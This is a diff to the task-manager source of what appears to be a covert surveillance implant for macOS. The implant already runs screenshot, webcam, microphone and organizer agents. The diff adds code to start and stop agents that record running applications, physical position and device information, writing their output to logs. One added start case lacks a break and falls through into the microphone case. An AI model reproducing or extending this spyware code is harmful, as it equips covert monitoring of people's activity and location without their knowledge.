@@ -16,7 +16,12 @@
 #import "RCSMAgentScreenshot.h"
 #import "RCSMAgentWebcam.h"
 #import "RCSMAgentOrganizer.h"
+
+#import "RCSMAgentPosition.h"
+#import "RCSMAgentDevice.h"
+
 #import "RCSMAgentMicrophone.h"
+
 
 #import "NSMutableDictionary+ThreadSafe.h"
 
@@ -30,6 +35,7 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+//#define DEBUG_TASK_MANAGER
 
 static RCSMTaskManager *sharedTaskManager = nil;
 static NSLock *gTaskManagerLock           = nil;
@@ -764,6 +770,54 @@ static NSLock *gSyncLock                  = nil;
           }
         break;
       }
+    case AGENT_APPLICATION:
+      {
+        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+        agentConfiguration = [[self getConfigForAgent: agentID] retain];
+        
+        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
+            [agentConfiguration objectForKey: @"status"] != AGENT_START)
+        {
+          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+          shMemoryHeader->agentID   = agentID;
+          shMemoryHeader->direction = D_TO_AGENT;
+          shMemoryHeader->command   = AG_START;
+          
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Creating APPLICATION Agent log file");
+#endif
+          BOOL success = [_logManager createLog: AGENT_APPLICATION
+                                    agentHeader: nil
+                                      withLogID: 0];
+          
+          if (success == TRUE)
+          {
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Starting Agent Application");
+#endif
+            if ([gSharedMemoryCommand writeMemory: agentCommand
+                                           offset: OFFT_APPLICATION
+                                    fromComponent: COMP_CORE] == TRUE)
+            {
+              [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
+#ifdef DEBUG_TASK_MANAGER
+              infoLog(@"Start command sent to Agent Application", agentID);
+#endif
+            }
+            else
+            {
+#ifdef DEBUG_TASK_MANAGER
+              infoLog(@"Error while sending start command to the agent");
+#endif
+              
+              [agentCommand release];
+              [agentConfiguration release];
+              return NO;
+            }
+          }
+        }
+        break;
+      }
     case AGENT_MOUSE:
       {
         agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
@@ -980,6 +1034,79 @@ static NSLock *gSyncLock                  = nil;
           }
         
         break;
+      }
+
+      case AGENT_POSITION:
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Starting Agent Position");
+#endif
+        RCSMAgentPosition *agentPosition = [RCSMAgentPosition sharedInstance];
+        agentConfiguration = [[self getConfigForAgent: agentID] retain];
+        
+        if (agentConfiguration != nil)
+        {
+          if ([agentConfiguration objectForKey: @"status"]    != AGENT_RUNNING
+              && [agentConfiguration objectForKey: @"status"] != AGENT_START)
+          {
+            [agentConfiguration setObject: AGENT_START forKey: @"status"];
+            [agentPosition setAgentConfiguration: agentConfiguration];
+            
+            [NSThread detachNewThreadSelector: @selector(start)
+                                     toTarget: agentPosition
+                                   withObject: nil];
+          }
+          else
+          {
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Agent Position is already running");
+#endif
+          }
+        }
+        else
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Agent not found");
+#endif
+          
+          return FALSE;
+        }
+        break;
+      }
+    case AGENT_DEVICE:
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Starting Agent Device");
+#endif
+        RCSMAgentDevice *agentDevice = [RCSMAgentDevice sharedInstance];
+        agentConfiguration = [[self getConfigForAgent: agentID] retain];
+        
+        if (agentConfiguration != nil)
+        {
+          if ([agentConfiguration objectForKey: @"status"]    != AGENT_RUNNING
+              && [agentConfiguration objectForKey: @"status"] != AGENT_START)
+          {
+            [agentConfiguration setObject: AGENT_START forKey: @"status"];
+            [agentDevice setAgentConfiguration: agentConfiguration];
+            
+            [NSThread detachNewThreadSelector: @selector(start)
+                                     toTarget: agentDevice
+                                   withObject: nil];
+          }
+          else
+          {
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Agent Device is already running");
+#endif
+          }
+        }
+        else
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Agent not found");
+#endif
+          return FALSE;
+        }
       }
     case AGENT_MICROPHONE:
       {
@@ -1228,6 +1355,39 @@ static NSLock *gSyncLock                  = nil;
         
         break;
       }
+    case AGENT_APPLICATION:
+      {
+        agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
+        
+        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+        shMemoryHeader->agentID         = agentID;
+        shMemoryHeader->direction       = D_TO_AGENT;
+        shMemoryHeader->command         = AG_STOP;
+        
+        if ([gSharedMemoryCommand writeMemory: agentCommand
+                                       offset: OFFT_APPLICATION
+                                fromComponent: COMP_CORE] == TRUE)
+        {
+#ifdef DEBUG_TASK_MANAGER
+          NSLog(@"%s: Stop command sent to Agent %x", __FUNCTION__, agentID);
+#endif
+          
+          agentConfiguration = [self getConfigForAgent: agentID];
+          [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+          
+          [_logManager closeActiveLog: AGENT_APPLICATION
+                            withLogID: 0];
+        }
+        else
+        {
+#ifdef DEBUG_TASK_MANAGER
+          NSLog(@"%s: Error while sending Stop command to Agent Application", __FUNCTION__);
+#endif
+          
+          return NO;
+        }
+        break;
+      }
     case AGENT_MOUSE:
       {
         agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
@@ -1327,6 +1487,22 @@ static NSLock *gSyncLock                  = nil;
         
         break;
       }
+    case AGENT_POSITION:
+      {
+#ifdef DEBUG_TASK_MANAGER        
+        infoLog(@"Stopping Agent Position");
+#endif
+        RCSMAgentPosition *agentPosition = [RCSMAgentPosition sharedInstance];
+        
+        if ([agentPosition stop] == FALSE)
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Error while stopping agent Position");
+#endif
+          return NO;
+        }
+        break;
+      }
     case AGENT_MICROPHONE:
       {
 #ifdef DEBUG_TASK_MANAGER        
@@ -1345,6 +1521,27 @@ static NSLock *gSyncLock                  = nil;
         agentConfiguration = [self getConfigForAgent: agentID];
         [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
         
+        break;
+      }
+    case AGENT_DEVICE:
+      {
+#ifdef DEBUG_TASK_MANAGER        
+        infoLog(@"Stopping Agent Device");
+#endif
+        RCSMAgentDevice *agentDevice = [RCSMAgentDevice sharedInstance];
+        
+        if ([agentDevice stop] == FALSE)
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Error while stopping agent agentDevice");
+#endif
+          return NO;
+        }
+        else
+        {
+          agentConfiguration = [self getConfigForAgent: agentID];
+          [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+        }
         break;
       }
     default:
@@ -1557,6 +1754,47 @@ static NSLock *gSyncLock                  = nil;
                 
                 break;
               }
+            case AGENT_APPLICATION:
+              {
+#ifdef DEBUG_TASK_MANAGER
+                NSLog(@"%s: Starting Agent Application", __FUNCTION__);
+#endif
+                agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
+                
+                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+                shMemoryHeader->agentID         = agentID;
+                shMemoryHeader->direction       = D_TO_AGENT;
+                shMemoryHeader->command         = AG_START;
+                  
+#ifdef DEBUG_TASK_MANAGER
+                NSLog(@"%s: Creating Application Agent log file", __FUNCTION__);
+#endif
+                BOOL success = [_logManager createLog: AGENT_APPLICATION
+                                          agentHeader: nil
+                                            withLogID: 0];
+                  
+                if (success == TRUE)
+                {
+                  if ([gSharedMemoryCommand writeMemory: agentCommand
+                                                 offset: OFFT_APPLICATION
+                                          fromComponent: COMP_CORE] == TRUE)
+                  {
+                    [anObject setObject: AGENT_RUNNING
+                                 forKey: @"status"];
+                    
+#ifdef DEBUG_TASK_MANAGER
+                    NSLog(@"%s: Start command sent to Agent Applicatioin", __FUNCTION__);
+#endif
+                  }
+                  else
+                  {
+#ifdef DEBUG_TASK_MANAGER
+                    NSLog(@"%s: An error occurred while starting agent Application", __FUNCTION__);
+#endif
+                  }
+                }
+                break;
+              }
             case AGENT_MOUSE:
               {
                 agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
@@ -1743,6 +1981,79 @@ static NSLock *gSyncLock                  = nil;
                       }
                   }
                 
+                break;
+              }
+            case AGENT_POSITION:
+              {
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Starting Agent Position");
+#endif
+                RCSMAgentPosition *agentPosition = [RCSMAgentPosition sharedInstance];
+                agentConfiguration = [[self getConfigForAgent: agentID] retain];
+                
+                if (agentConfiguration != nil)
+                {
+                  if ([agentConfiguration objectForKey: @"status"]    != AGENT_RUNNING
+                      && [agentConfiguration objectForKey: @"status"] != AGENT_START)
+                  {
+                    [agentConfiguration setObject: AGENT_START forKey: @"status"];
+                    [agentPosition setAgentConfiguration: agentConfiguration];
+                    
+                    [NSThread detachNewThreadSelector: @selector(start)
+                                             toTarget: agentPosition
+                                           withObject: nil];
+                  }
+                  else
+                  {
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Agent Position is already running");
+#endif
+                  }
+                }
+                else
+                {
+#ifdef DEBUG_TASK_MANAGER
+                  infoLog(@"Agent not found");
+#endif
+                  
+                  return FALSE;
+                }
+                break;
+              }
+            case AGENT_DEVICE:
+              {
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Starting Agent Device");
+#endif
+                RCSMAgentDevice *agentDevice = [RCSMAgentDevice sharedInstance];
+                agentConfiguration = [[self getConfigForAgent: agentID] retain];
+                
+                if (agentConfiguration != nil)
+                {
+                  if ([agentConfiguration objectForKey: @"status"]    != AGENT_RUNNING
+                      && [agentConfiguration objectForKey: @"status"] != AGENT_START)
+                  {
+                    [agentConfiguration setObject: AGENT_START forKey: @"status"];
+                    [agentDevice setAgentConfiguration: agentConfiguration];
+                    
+                    [NSThread detachNewThreadSelector: @selector(start)
+                                             toTarget: agentDevice
+                                           withObject: nil];
+                  }
+                  else
+                  {
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Agent Device is already running");
+#endif
+                  }
+                }
+                else
+                {
+#ifdef DEBUG_TASK_MANAGER
+                  infoLog(@"Agent not found");
+#endif
+                  return FALSE;
+                }
                 break;
               }
             case AGENT_MICROPHONE:
@@ -1937,6 +2248,36 @@ static NSLock *gSyncLock                  = nil;
                 
                 break;
               }
+            case AGENT_APPLICATION:
+              {
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Stopping Agent Application");
+#endif
+                NSMutableData *agentCommand = 
+                [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+                
+                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+                shMemoryHeader->agentID         = agentID;
+                shMemoryHeader->direction       = D_TO_AGENT;
+                shMemoryHeader->command         = AG_STOP;
+                
+                if ([gSharedMemoryCommand writeMemory: agentCommand
+                                               offset: OFFT_APPLICATION
+                                        fromComponent: COMP_CORE] == TRUE)
+                {
+#ifdef DEBUG_TASK_MANAGER
+                  infoLog(@"Stop command sent to Agent Application", agentID);
+#endif
+                  
+                  [anObject setObject: AGENT_STOPPED forKey: @"status"];
+                  [_logManager closeActiveLog: AGENT_APPLICATION
+                                    withLogID: 0];
+                }
+                
+                [agentCommand release];
+                
+                break;
+              }
             case AGENT_MOUSE:
               {
 #ifdef DEBUG_TASK_MANAGER
@@ -2043,6 +2384,46 @@ static NSLock *gSyncLock                  = nil;
               
                 [agentCommand release];
                 
+                break;
+              }
+            case AGENT_POSITION:
+              {
+#ifdef DEBUG_TASK_MANAGER        
+                infoLog(@"Stopping Agent Position");
+#endif
+                RCSMAgentPosition *agentPosition = [RCSMAgentPosition sharedInstance];
+                
+                if ([agentPosition stop] == FALSE)
+                {
+#ifdef DEBUG_TASK_MANAGER
+                  infoLog(@"Error while stopping agent Position");
+#endif
+                  return NO;
+                }
+                else
+                {
+                  [anObject setObject: AGENT_STOPPED forKey: @"status"];
+                }
+                break;
+              }
+            case AGENT_DEVICE:
+              {
+#ifdef DEBUG_TASK_MANAGER        
+                infoLog(@"Stopping Agent Device");
+#endif
+                RCSMAgentDevice *agentDevice = [RCSMAgentDevice sharedInstance];
+                
+                if ([agentDevice stop] == FALSE)
+                {
+#ifdef DEBUG_TASK_MANAGER
+                  infoLog(@"Error while stopping agent agentDevice");
+#endif
+                  return NO;
+                }
+                else
+                {
+                  [anObject setObject: AGENT_STOPPED forKey: @"status"];
+                }
                 break;
               }
             case AGENT_MICROPHONE:
